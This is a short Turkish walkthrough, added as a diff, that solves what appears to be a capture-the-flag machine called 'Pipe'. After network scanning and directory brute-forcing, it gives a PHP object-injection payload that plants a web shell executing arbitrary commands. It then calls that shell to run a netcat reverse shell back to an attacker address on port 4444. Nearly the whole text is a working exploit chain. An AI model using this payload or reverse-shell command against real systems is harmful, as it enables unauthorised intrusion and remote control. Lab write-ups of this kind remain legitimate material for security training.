@@ -1,0 +1,7 @@
+PİPE MAKİNE ÇÖZÜMÜ
+1 - arp-scan --localnet ile IP adresi 192.168.2.100 bulundu.
+2 - nmap -sT -A -p- 192.168.2.100
+3 - gobuser dir -u http://192.168.2.100 -m POST -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+4 - Click -> Show Artist Info 
+5 - Burp Suite -> param=O:3:”Log”:2:{s:8:”filename”;s:29:”/var/www/html/scriptz/shell.php”;s:4:”data”;s:118:”%3C%3Fphp%20echo%20%27%3Cpre%3E%27%3B%20system%28%24_GET%5B%27cmd%27%5D%29%3B%20echo%20%27%3C%2Fpre%3E%27%3B%20%3F%3E”;}
+6 - http://192.168.2.100/scriptz/shell.php?cmd=nc -e /bin/bash 192.168.2.128 4444
